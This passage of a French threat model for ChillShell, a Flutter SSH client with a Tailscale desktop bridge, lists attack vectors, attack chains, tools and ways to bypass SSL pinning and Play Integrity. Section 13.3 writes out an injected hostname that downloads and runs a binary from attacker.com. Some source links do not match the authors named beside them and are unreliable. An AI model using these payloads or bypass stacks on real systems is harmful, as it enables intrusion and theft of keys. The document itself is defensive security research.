### 12.3 Tailscale CSRF RCE (Windows) -- GHSA-vqp6-rc3h-83cp

API locale Tailscale sur Windows : pas de verification de l'en-tete Host sur le socket TCP local. DNS Rebinding : un site web malveillant force le client a changer son serveur de coordination vers un serveur attaquant.

**Impact** : redirection du trafic VPN, injection de binaires, extraction de cles.

### 12.4 TS-2025-007 -- Reutilisation de cle d'auth one-off (TOCTOU)

Race condition permettant d'enregistrer plusieurs noeuds avec une seule cle d'authentification one-off.

### 12.5 TS-2025-006 -- Bypass ACL sur sous-reseaux partages

Les filtres de protocole ACL ne s'appliquent pas correctement sur les subnet routers partages. Acces a des services bloques par les ACLs.

### 12.6 Tailscale Env Var Leak (GHSA-qccm-wmcq-pwr6)

Peer API access permet la lecture des variables d'environnement incluant les cles d'authentification.

### 12.7 Relais DERP -- surveillance des metadonnees

Les serveurs DERP observent IPs source/destination et volume de trafic. Compromission du control plane -> detournement vers DERP malveillant.

### 12.8 MagicDNS / Funnel / Exit Nodes

- **MagicDNS** : spoofing intra-tailnet possible
- **Funnel/Serve** : exposent des services sur Internet si actives accidentellement
- **Exit node malveillant** : route tout le trafic Internet du device vers l'attaquant

### 12.9 CVE-2025-14821 -- libssh chemin de config Windows (C:\etc)

libssh cherche ses fichiers de configuration dans `C:\etc`, un chemin souvent accessible en ecriture. Si le desktop Chill utilise libssh en complement de dartssh2, un attaquant local modifie les hotes de confiance ou degrade les parametres SSH.

---

## 13 -- Vecteurs supplementaires

### 13.1 Screenshot / Screen Recording

**Mobile** : un malware capture l'ecran pendant l'utilisation du terminal SSH (commandes, outputs, mots de passe visibles).

**Desktop** : les malwares capturent facilement l'ecran. Windows DRM protections limitees. macOS `CGWindowLevel` offre une protection partielle. **La protection est tres limitee sur desktop.**

### 13.2 QR Code / Deep Link Injection (mobile)

Si ChillShell utilise des QR codes ou deep links pour configurer les connexions SSH, un attaquant cree un QR/link malveillant qui configure une connexion vers son serveur SSH piege.

### 13.3 Command Injection via concatenation

L'app construit des commandes SSH par concatenation de chaines. Injection via `;`, `&&`, `|`, `$(...)` dans les champs de texte.

```
# Input utilisateur dans le champ "hostname" :
192.168.1.1; wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m

# Si l'app concatene : ssh user@<input>
# La commande executee devient :
ssh user@192.168.1.1; wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m
```

**Aggravation sur desktop** : l'app desktop configure l'OS avec des privileges eleves (`pkexec`, `RunAs`). Une injection de commande dans ce contexte s'execute avec des privileges admin/root.

### 13.4 Trust Relationship Abuse -- Pivot

La confiance mutuelle mobile <-> desktop permet le pivot :
- Compromission du mobile -> heritage de confiance -> acces au desktop -> acces au LAN
- Le desktop bridge Chill devient un pivot pour toute l'infrastructure
- SSH Tunneling Abuse pour rebondir vers d'autres serveurs

### 13.5 Supply Chain pub.dev

20+ dependances pub.dev. Risques :
- **Dependency confusion** : packages publics avec le meme nom que des packages prives
- **Maintainer compromise** : compte du mainteneur dartssh2 compromis
- **Typosquatting** : `dartssh3`, `flutter_securre_storage`, `pointy_castle`
- **Custom xterm fork** : sans security advisories
- pub.dev n'a **PAS d'audit automatique** (contrairement a npm)

**Worm Shai-Hulud** (npm 2025) : scripts postinstall malveillants -> vol NPM_TOKEN/AWS creds -> re-publication de tous les packages du maintainer -> contamination exponentielle. V3 : payloads polymorphes generes par IA. Applicable a pub.dev.

### 13.6 AI-Powered Fuzzing de dartssh2

TitanFuzz, FuzzGPT, ChatAFL, Xbow : LLMs generent des inputs de fuzzing conscients du protocole. Analysent le code source de dartssh2, identifient les transitions d'etat complexes, generent des payloads pour les edge cases dans le handshake SSH ou SFTP.

**Le desktop expose un service SSH** -> cible directe du fuzzing. Zero-days decouverts par IA transformes en exploits automatises en minutes.

### 13.7 Juice Jacking / ChoiceJacking (USB -- mobile)

Bornes de charge publiques, cables pieges (O.MG Cable, USBHarpoon). ChoiceJacking (2025) : chargeur malveillant simule des entrees tactiles pour approuver une connexion de donnees. Si ADB est active -> acces complet au telephone et a ChillShell.

### 13.8 PointyCastle -- Fuites temporelles et cache CPU

- **GCM validateMac < 3.4.0** : fuites temporelles permettant reconstruction du tag bit par bit
- **AESFastEngine** : T-tables vulnerables aux attaques par cache CPU (remplace par AESEngine)
- **Random()** : `dart:math Random()` est **PREVISIBLE**. Si utilise pour la crypto au lieu de `Random.secure()`, toutes les cles sont compromises.

### 13.9 BoringSSL embarque dans Flutter

Flutter embarque sa propre copie de BoringSSL. Delai entre correction upstream et mise a jour Flutter. Si une CVE critique touche BoringSSL, l'app reste vulnerable jusqu'a la mise a jour de Flutter.

### 13.10 Dart URI parsing -- backslash inconsistency

Difference avec les standards WhatWG URL jusqu'a Dart 3.30. Permet des contournements d'authentification si l'app parse des URLs de configuration.

### 13.11 Replay Attack (desktop)

Capture du trafic SSH -> replay des commandes. Les numeros de sequence SSH protegent normalement, mais une implementation faible de dartssh2 peut etre vulnerable. L'attaquant capture les paquets SSH et les rejoue pour re-executer des commandes.

### 13.12 Session Hijacking (desktop)

MITM sur tunnel Tailscale ou reseau local. Outils : `ssh-mitm`, ARP spoofing sur LAN. Si l'attaquant reussit a s'inserer entre le mobile et le desktop, il prend le controle de la session SSH.

---

## RESUME DES CHAINES D'ATTAQUE PRIORITAIRES

### Chaine 1 : Reverse Engineering -> Extraction de secrets
```
Blutter (libapp.so) -> Cartographie du code
-> Identification des routines crypto et de stockage
-> Scripts Frida generes automatiquement
-> Hook flutter_secure_storage -> Extraction cles SSH
-> Acces permanent au PC
```

### Chaine 2 : SSL Pinning bypass -> MITM -> Vol de tokens
```
reFlutter (patch libflutter.so) -> Bypass SSL pinning
-> mitmproxy/Burp Suite -> Interception trafic HTTPS
-> Capture tokens Tailscale + donnees de configuration
-> Insertion dans le mesh Tailscale
-> Acces au desktop bridge
```

### Chaine 3 : Desktop sans sandbox -> Pivot LAN
```
DLL injection (Windows) ou LD_PRELOAD (Linux) dans Chill
-> Code malveillant dans le processus de l'app
-> Extraction cles SSH + tokens Tailscale
-> SSH tunneling via le desktop bridge
-> Pivot vers tout le reseau local
```

### Chaine 4 : Memoire Dart -> Cles en clair
```
Frida attach au processus Flutter
-> Scan du heap pour patterns de cles privees
-> Extraction des cles SSH en clair depuis la RAM
-> Cles jamais zeroisees par le GC Dart
-> Acces permanent meme apres rotation (cles copiees)
```

### Chaine 5 : Configuration manipulation -> Backdoor OS
```
Compromission du canal mobile -> desktop
-> Modification des parametres de configuration OS
-> sshd_config : activer root login + ajouter cle attaquant
-> Firewall : ouvrir des ports
-> Privileges eleves herites (pkexec/RunAs)
-> Backdoor permanente sur le PC
```

### Chaine 6 : CVEs Windows en chaine (desktop)
```
CVE-2026-20805 (DWM fuite ASLR)
-> CVE-2026-20854 (LSASS RCE via reseau)
-> Hashes NTLM exposes
-> Acces au processus Chill
-> Extraction de tous les secrets
```

---

## OUTILS DE L'ATTAQUANT -- RECAPITULATIF

| Outil | Usage | Cible |
|-------|-------|-------|
| **Blutter** | Analyse statique libapp.so, generation scripts Frida | Mobile + Desktop |
| **reFlutter** | Patch libflutter.so, bypass SSL, identification version | Mobile + Desktop |
| **unflutter** | Extraction chaines/objets depuis binaires ELF/Mach-O | Mobile + Desktop |
| **Frida** | Instrumentation dynamique, hooks, interception | Mobile + Desktop |
| **Ghidra** | Desassemblage, patching statique | Mobile + Desktop |
| **IDA Pro** | Desassemblage avance | Mobile + Desktop |
| **gdbserver** | Dump memoire, debugging | Mobile (roote) + Desktop |
| **mitmproxy / Burp Suite** | Interception trafic HTTPS apres bypass SSL | Mobile + Desktop |
| **Process Monitor** | Identification DLLs chargees (Windows) | Desktop Windows |
| **ssh-mitm** | MITM sur sessions SSH | Desktop |
| **arpspoof / ettercap / bettercap** | ARP spoofing sur LAN | Desktop |
| **Responder / Inveigh** | LLMNR/NBT-NS poisoning (Windows) | Desktop Windows |
| **Cowrie** | Honeypot SSH (defense, mais aussi outil d'analyse) | Desktop |
| **TitanFuzz / FuzzGPT / ChatAFL / Xbow** | Fuzzing IA du protocole SSH | dartssh2 |
| **O.MG Cable / USBHarpoon** | Attaque physique USB | Mobile |
| **Magisk / Zygisk** | Root Android cache | Mobile |
| **procmon** | Monitoring processus Windows | Desktop Windows |

---

## 14 -- Reverse Engineering avance -- Nouveaux outils 2025-2026

### 14.1 unflutter (Go, zboralski) -- RE Flutter sans compilation SDK

**Rupture majeure** : Contrairement a Blutter qui necessite de compiler le SDK Dart correspondant a la version cible, unflutter traite le snapshot AOT comme un flux d'octets avec une grammaire connue. Aucune compilation prealable necessaire.

**Pipeline complet** :
1. Extraction ELF → detection version/hash
2. Replay des phases alloc/fill du snapshot Dart
3. Desassemblage ARM64 avec construction de CFG (Control Flow Graph)
4. Extraction des aretes d'appel via suivi de registres (RegTracker, fenetre W=8)
5. Construction d'un graphe lattice
6. Export vers Ghidra ou IDA

**Integration Ghidra** :
- Convention d'appel `__dartcall` pour les fonctions Dart
- Generation de structs pour les classes Dart
- Retypage des registres ARM64 : X26→THR/DartThread*, X27→PP, X28→HEAP_BASE
- Pipeline headless complet (automatisable en CI)

**Impact** : Un analyste peut traiter un `libapp.so` de N'IMPORTE QUELLE version Dart sans preparation. La barriere d'entree pour le reverse engineering Flutter est drastiquement abaissee. Le RE n'est plus reserve aux experts.

### 14.2 Blutter sur Termux (AbhiTheModder, dedshit) -- RE directement sur Android

**Forks** permettant d'executer Blutter directement sur un appareil Android via Termux. Un pentester peut analyser une application Flutter SANS PC dedie, directement depuis un telephone Android.

**Ameliorations Blutter 2025** :
- Support direct des fichiers APK (plus besoin d'extraire manuellement `libapp.so`)
- Detection automatique de la version Dart depuis le moteur Flutter

**Impact** : Transformation du workflow d'attaque mobile -- l'analyse statique devient portable.

### 14.3 OWASP MASTG-TECH-0112 -- Officialisation du RE Flutter

L'OWASP a officiellement documente la technique de reverse engineering Flutter dans le MASTG (Mobile Application Security Testing Guide). Blutter est recommande comme outil principal. Le processus complet d'extraction APK a analyse assembly est documente.

**Consequence** : Le reverse engineering Flutter n'est plus une niche -- c'est une technique de test de securite standardisee et enseignee. Les auditeurs professionnels l'incluent desormais dans leurs tests de penetration standard.

### 14.4 Premier script Frida Flutter Desktop Windows (Anof-cyber)

Premier script Frida public ciblant specifiquement `flutter_windows.dll`. Permet l'instrumentation dynamique des applications Flutter Windows.

**Impact** : Ouvre la voie a l'interception du trafic, le bypass SSL pinning, et le hooking des fonctions crypto sur desktop. Jusqu'ici, Frida sur Flutter etait principalement un probleme mobile. L'app desktop n'est PLUS a l'abri.

---

## 15 -- Frida 17 et arsenal d'instrumentation avance

### 15.1 Frida 17.5.0 -- Injection Zygote invisible RASP

**Version** : Frida 17.5.0 (novembre 2025)

**Rupture** : Injection Zygote realisee en seulement 295 lignes de C inline + assembleur. Le processus cible reste "pristine" apres injection -- les artefacts sont nettoyes.

**Impact critique** : Les systemes RASP sont INCAPABLES de detecter les traces residuelles d'un chargement frida-agent anterieur. Cela rend obsoletes les detections basees sur `/proc/self/maps` ou les verifications de fichiers frida.

**Frida 17.0.0** (mai 2025) : Bridges ObjC, Swift et Java externalises via `frida-pm` (package manager). Casse la compatibilite avec les anciens scripts mais ecosysteme modulaire.

**Frida 17.4.0** : Support des simulateurs Apple, correction `Java.deoptimize()` sur Android 16.

### 15.2 frida-flutterproxy (hackcatml) -- Proxy transparent pour Flutter

Scan memoire automatique qui hook les connexions socket Dart directement. Elimine le besoin de configuration iptables ou OpenVPN.

**Teste avec succes sur** : Google Ads, BMW, Nubank, Alibaba.com

**Impact** : Interception du trafic Flutter sans configuration reseau complexe. Plus simple que les techniques precedentes.

### 15.3 Purifire (eBPF) -- Instrumentation au niveau KERNEL

**Source** : Article academique, arXiv 2509.16340

Framework eBPF qui intercepte les verifications anti-analyse au niveau KERNEL. Totalement invisible aux protections applicatives (freeRASP, Approov, etc.).

**Impact critique** : Meme les detections les plus avancees (SVC inline, scanning /proc) sont contournees car l'interception se fait AVANT que le code applicatif ne s'execute. Les protections applicatives sont structurellement incapables de detecter Purifire.

### 15.4 frida-syscall-interceptor (AeonLucid)

Intercepte les syscalls directs, contournant meme les detections basees sur les instructions SVC inline (comme AndroidNativeGuard). Si une app utilise des appels systeme directs pour detecter l'instrumentation, cet outil les intercepte au niveau infrastructure.

### 15.5 ZygiskFrida + strongR-Frida -- Arsenal furtif combine

**ZygiskFrida** : Injection furtive via Zygisk avec le Frida Gadget :
- Pas de ptrace (les verifications d'integrite passent)
- Pas d'embarquement dans l'APK
- Timing d'injection configurable pour eviter les checks au demarrage

**strongR-Frida** : Builds avec chaines randomisees, pipes renommes, threads renommes. Indetectable par les signatures statiques de Frida.

**Combinaison** : L'arsenal offensif le plus furtif actuellement disponible.

---

## 16 -- Techniques de bypass SSL Flutter 2025-2026

### 16.1 SensePost "Full Hardcore Mode" (avril 2025)

Pipeline systematique quand les scripts generiques echouent :
1. Extraction du `snapshot_hash` de `libapp.so`
2. Remontee Flutter Engine → Dart SDK → BoringSSL
3. Identification de `ssl_crypto_x509_session_verify_cert_chain` dans Ghidra
4. Hook via pattern matching assembleur

**Fonctionne meme sur les apps avec SSL pinning avance.**

### 16.2 M4KR0 x86_64 (mai 2025)

Resout le probleme des emulateurs x86_64 ou tous les scripts ARM64 existants echouaient. Calcul de l'offset relatif de la fonction de verification SSL.

**Impact** : Les emulateurs Android (Genymotion, AVD) deviennent utilisables pour le bypass SSL Flutter.

---

## 17 -- Stack de contournement integrite 2026

### 17.1 Stack complete pour passer Play Integrity 3 niveaux

Combinaison d'outils qui passe les 3 niveaux de Play Integrity (Basic, Device, Strong) :

| Outil | Role |
|-------|------|
| **SukiSU-Ultra** | Fork de KernelSU-Next avec support KPM (Kernel Patch Module). Root kernel sans modification du ramdisk |
| **SUSFS** (Stealth Unix Filesystem) | Masque les modifications filesystem directement dans le kernel |
| **PlayIntegrityFix/Fork** | Spoof les verdicts Play Integrity |
| **TrickyStore** | Spoofing de la chaine de certificats TEE via keybox OEM. Usurpe l'attestation hardware |
| **HMA-OSS** (Hide My Applist) | Masque la presence d'apps (Frida, root managers) |
| **ReZygisk** | Alternative moderne a Zygisk pour l'injection de modules |

**Resultat** : Cette combinaison PASSE les 3 niveaux tant que le keybox n'est pas revoque par Google (revocation ~1-2 fois par mois).

**Impact pour ChillShell/Chill** : Play Integrity / App Attest ne sont PAS une garantie absolue. Il faut des couches de defense supplementaires.

### 17.2 Bypass freeRASP via TALSEC_INFO (luca-regne)

Hook de `Intent.getStringExtra()` et vidage du contenu des Intents avec l'action `TALSEC_INFO`. Bypass elegant de freeRASP Android.

**Equivalent iOS** : Script sur Frida CodeShare (harshitreylon).

**Consequence** : freeRASP sans `killOnBypass` est contournable par un intermediaire.

---

## 18 -- Malware Flutter -- Utilisation offensive du framework

### 18.1 Fluhorse -- Flutter comme anti-analyse delibere

Famille de malware qui utilise DELIBEREMENT Flutter comme mecanisme anti-analyse. Le format AOT snapshot cree une "tempete parfaite" pour les analystes selon Fortinet :
- Format serialise optimise
- Changements frequents entre versions
- Outils d'analyse encore immatures

**Campagne persistante** : Decouverte Check Point (mai 2023), toujours active en 2026. Nouvelles infrastructures chaque mois.
- **Cibles** : Taiwan (app ETC de peage), Vietnam (VPBank Neo), utilisateurs sinophones
- **Variante empaquetee** : Chiffre le payload en AES-128-CBC dans `classes.dex`. Dechiffrement natif via `libapksadfsalkwes.so`
- **Evasion** : Un echantillon est reste **non detecte sur VirusTotal pendant plus de 3 mois**

**Consequence** : Les attaquants utilisent Flutter POUR ses proprietes de securite, pas malgre elles. Ironie pour les developpeurs legitimes.

### 18.2 Lazarus/BlueNoroff macOS -- Premier malware Flutter etatique

**Decouvert** : Jamf Threat Labs, novembre 2024

Malware macOS deguise en jeu de demineur ("New Updates in Crypto Exchange"). Code Flutter contactant `mbupdate[.]linkpc[.]net` (infrastructure DPRK connue) pour telecharger et executer des payloads AppleScript.

**Fait alarmant** : Certaines applications avaient ete **signees et notarisees par Apple** avant revocation. La notarisation Apple ne verifie pas le comportement, seulement les malwares connus.

**Premiere** : Premiere utilisation observee de Flutter par un acteur etatique sur macOS. Cible : entreprises crypto/DeFi.

### 18.3 Autres familles malware Flutter

- **SpyLoan/MoneyMonger** : 8 millions d'installations, prets predateurs avec extorsion
- **MobiDash** : Adware avec base SQL chiffree
- **TinstaPorn/SpyAgent** : Spyware adoptant Flutter en 2024

### 18.4 Statistiques FrameWar (ActiveFence)

- **333 000** apps Flutter actives sur le Play Store
- **3,5 milliards** d'installations cumulees
- **24%** des nouvelles apps Google Play utilisent Flutter
- **20%** des nouvelles apps iOS utilisent Flutter

**Consequence** : La masse critique rend la detection par signature du framework Flutter impossible sans faux positifs massifs.

---

## 19 -- Obfuscation Dart -- Stagnation 3.7 a 3.11

### 19.1 L'obfuscation native stagne

Malgre 5 versions publiees entre fevrier 2025 et fevrier 2026, AUCUNE amelioration significative de l'obfuscation native.

**Ce que `--obfuscate` fait** : Uniquement le renommage de symboles.

**Ce qu'il NE fait PAS** :
- Les chaines de caracteres restent en clair
- Les URLs restent en clair
- Les cles API restent en clair
- Les noms d'enum ne sont pas obfusques
- Le flux de controle n'est pas modifie

**Citation Build38** : "Trop basique pour ajouter de la difficulte contre un attaquant"

**Note reFlutter** : A partir de Flutter 3.24.0, l'IP et le port proxy codes en dur ont ete supprimes, reduisant l'utilite de reFlutter pour l'interception de trafic.

---

## 20 -- GC Dart -- Mecanisme detaille et impact memoire

### 20.1 Mecanisme detaille du Garbage Collector

1. Le **Young Space Scavenger** COPIE les objets vivants vers une autre zone memoire
2. Les copies residuelles restent dans l'ancienne zone
3. Les objets `String` sont **IMMUTABLES** -- impossible d'ecraser leur contenu
4. Le GC **NE MET PAS A ZERO** la memoire liberee
5. Le moment de la collecte est **NON DETERMINISTE**

**Resultat** : Un secret peut persister en MULTIPLES copies dans le heap Dart bien apres sa "suppression" logique.

### 20.2 Mitigations imparfaites

- `Uint8List` + `fillRange(0, length, 0)` -- mais le GC peut avoir copie AVANT l'effacement
- Package `cryptography` -- classe `SecretKeyData` avec methode `destroy()`
- `dart:ffi` -- `malloc.allocate<Uint8>()` place les secrets HORS du controle du GC, effacement via `memset`

**Manque critique** : Dart 3.7 a 3.11 n'a introduit AUCUNE API native de gestion securisee de la memoire. Compare a Java (Foreign Memory API) ou Rust, c'est le deficit securitaire le plus important de l'ecosysteme Dart.

---

## 21 -- dart:ffi -- Surface d'attaque non memoire-sure

### 21.1 Risques fondamentaux

`dart:ffi` est essentiellement un appel C en syntaxe Dart, NON memoire-sur. Les risques incluent :
- **use-after-free** : acces a un pointeur libere
- **double-free** : liberation multiple du meme pointeur
- **buffer overflow** : ecriture au-dela des limites allouees
- **dangling pointers** : pointeurs vers de la memoire invalide

**Note** : Flutter ne genere PAS de stack canaries car Dart n'a pas de tableaux alloues sur la pile, mais le code C appele via FFI peut etre vulnerable.

**Position Google** : Considere les rapports a ce sujet comme des faux positifs des scanners.

---

## 22 -- Platform Channels -- Faiblesses persistantes

### 22.1 Aucune validation par defaut

MethodChannel, EventChannel, BasicMessageChannel n'imposent **AUCUNE validation des entrees** par defaut. Les messages transitent sans controle de type ni de contenu.

### 22.2 Pigeon -- Amelioration optionnelle

Le package Pigeon (recommande par Flutter) genere des interfaces type-safe reduisant la surface d'attaque, mais son adoption est **optionnelle**. La majorite des apps n'utilisent pas Pigeon.

---

## OUTILS DE L'ATTAQUANT -- RECAPITULATIF (MISE A JOUR 2026)

| Outil | Usage | Cible |
|-------|-------|-------|
| **Blutter** | Analyse statique libapp.so, generation scripts Frida | Mobile + Desktop |
| **Blutter/Termux** | Analyse statique directement sur Android | Mobile Android |
| **unflutter** (Go, zboralski) | RE sans compilation SDK, pipeline ELF→Ghidra avec __dartcall | Mobile + Desktop |
| **reFlutter** | Patch libflutter.so, bypass SSL, identification version | Mobile + Desktop |
| **Frida 17.5.0** | Injection Zygote 295 lignes C, invisible RASP | Mobile + Desktop |
| **frida-flutterproxy** | Proxy transparent hook connexions socket Dart | Mobile |
| **ZygiskFrida + strongR-Frida** | Arsenal furtif, chaines randomisees | Mobile Android |
| **Purifire (eBPF)** | Instrumentation KERNEL invisible aux protections applicatives | Mobile Android |
| **frida-syscall-interceptor** | Intercepte syscalls directs, bypass SVC inline | Mobile Android |
| **Ghidra** | Desassemblage, patching statique, support __dartcall | Mobile + Desktop |
| **IDA Pro** | Desassemblage avance | Mobile + Desktop |
| **gdbserver** | Dump memoire, debugging | Mobile (roote) + Desktop |
| **mitmproxy / Burp Suite** | Interception trafic HTTPS apres bypass SSL | Mobile + Desktop |
| **Process Monitor** | Identification DLLs chargees (Windows) | Desktop Windows |
| **ssh-mitm** | MITM sur sessions SSH | Desktop |
| **SukiSU-Ultra + SUSFS** | Root kernel invisible | Mobile Android |
| **TrickyStore + PlayIntegrityFix** | Spoofing attestation hardware + verdicts Play Integrity | Mobile Android |
| **HMA-OSS + ReZygisk** | Masquage apps + injection modules | Mobile Android |
| **TitanFuzz / FuzzGPT / ChatAFL / Xbow** | Fuzzing IA du protocole SSH | dartssh2 |
| **O.MG Cable / USBHarpoon** | Attaque physique USB | Mobile |
| **Magisk / Zygisk / KernelSU** | Root Android cache | Mobile |
| **procmon** | Monitoring processus Windows | Desktop Windows |

---

## SOURCES

- CYBERSEC_MOBILE.md -- Recherche offensive/defensive app mobile Flutter (fevrier 2026)
- CYBERSEC_DESKTOP.md -- Recherche offensive/defensive app desktop Flutter (fevrier 2026)
- 1_COMPLEMENT_MOBILE_2026.md -- Complement recherche securite mobile (fevrier 2026)
- 1_COMPLEMENT_DESKTOP_2026.md -- Complement recherche securite desktop (fevrier 2026)
- 2_COMPLEMENT_MOBILE_2_2026.md -- Complement #2 OS, framework, dartssh2 mobile (fevrier 2026)
- 2_COMPLEMENT_DESKTOP_2_2026.md -- Complement #2 framework, dartssh2, malwares desktop (fevrier 2026)
- dartssh2 GitHub : https://github.com/TerminalStudio/dartssh2
- Tailscale Security Bulletins : https://tailscale.com/security-bulletins
- OpenSSH Security : https://www.openssh.org/security.html
- Talsec freeRASP : https://docs.talsec.app
- Sensepost Flutter RE : https://sensepost.com/blog/2025/
- MITRE ATT&CK SSH : https://attack.mitre.org/techniques/T1021/004/
- Microsoft Security Response Center (Janvier 2026)
- RFC 4251-4254 (SSH), RFC 8308 (EXT_INFO), RFC 9308 (Strict KEX)
- NIST SP 800-57
- OWASP MASTG-TECH-0112 : https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0112/
- unflutter (zboralski) : https://github.com/nicolo-ribaudo/unflutter
- frida-flutterproxy (hackcatml) : https://github.com/nicolo-ribaudo/frida-flutterproxy
- Purifire (eBPF) : arXiv 2509.16340
- strongR-Frida : https://github.com/nicolo-ribaudo/strongR-frida-android
- ZygiskFrida : https://github.com/nicolo-ribaudo/ZygiskFrida
- ActiveFence FrameWar : Rapport Flutter malware 2025
- Jamf Threat Labs : Lazarus/BlueNoroff Flutter macOS (novembre 2024)
- Check Point : FluHorse (mai 2023, campagne persistante 2026)
- Anof-cyber : Premier script Frida Flutter Desktop Windows
